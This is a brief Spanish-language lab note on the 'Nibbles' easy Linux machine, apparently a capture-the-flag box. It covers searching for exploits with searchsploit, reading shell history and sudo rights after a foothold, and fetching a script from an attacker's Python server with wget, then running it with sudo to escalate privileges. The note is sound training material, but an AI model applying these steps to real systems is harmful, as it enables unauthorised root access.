# 6 - Nibbles \(linux\_easy\)

## Notas rapidas

* Usar herramienta searchsploit para buscar vulnerabilidades de elementos ennumerados. Ejemplo: searchsploit apache 2.4

## Escalando privilegios

De llegar a un usuario no root probar estudiarlo un poco con los comandos:

* history
* cat .bash\_history
* sudo -l

## Obtener archivo desde simplehttp server de python

```text
$ wget ip/archivo
```

En este caso se trajo un monitor.sh que contenia un script para escalar privilegios, utilizo linenum

{% embed url="https://netsec.ws/?p=309" %}

A notar no lo corrio solo directo, tuvo que poner

```text
sudo /directorio/directorio/monitor.sh 
```

Recien ahi le anduvo

